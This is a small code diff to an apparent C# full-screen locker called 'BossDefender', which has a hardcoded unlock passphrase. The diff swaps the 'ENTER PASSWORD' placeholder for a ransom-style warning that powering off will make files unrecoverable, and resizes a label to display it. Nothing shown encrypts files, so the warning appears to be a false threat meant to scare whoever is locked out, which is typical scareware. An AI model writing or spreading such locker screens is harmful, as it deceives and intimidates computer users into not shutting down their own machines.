@@ -42,7 +42,7 @@ sealed class Screen : Form
     // (apart from surrounding whitespace and letter case).
     private const string Passphrase = "bomboclat";
     private const int MaxInputLength = 16;
-    private const string Placeholder = "ENTER PASSWORD";
+    private const string Placeholder = "DON'T TRY TO POWER OFF, OTHERWISE FILES CAN'T BE RECOVERED";
     private const string DeniedText = "ACCESS DENIED";
 
     private readonly System.Windows.Forms.Timer _animate;
@@ -323,7 +323,7 @@ sealed class Screen : Form
         using (Graphics g = CreateGraphics())
         {
             string family = PickDisplayFamily();
-            Font locked = FitFont(g, family, Math.Max(12f, h * 0.030f), FontStyle.Regular, "Locked by", w * 0.58f);
+            Font locked = FitFont(g, "Consolas", Math.Max(11f, _fieldRect.Height * 0.34f),FontStyle.Bold, Placeholder, _fieldRect.Width * 0.90f);
             Font name = FitFont(g, family, Math.Max(20f, h * 0.080f), FontStyle.Bold, "BossDefender", w * 0.90f);
             Font placeholder = new Font("Consolas", Math.Max(11f, _fieldRect.Height * 0.34f), FontStyle.Bold, GraphicsUnit.Pixel);
             Font status = new Font("Consolas", Math.Max(11f, h * 0.021f), FontStyle.Bold, GraphicsUnit.Pixel);
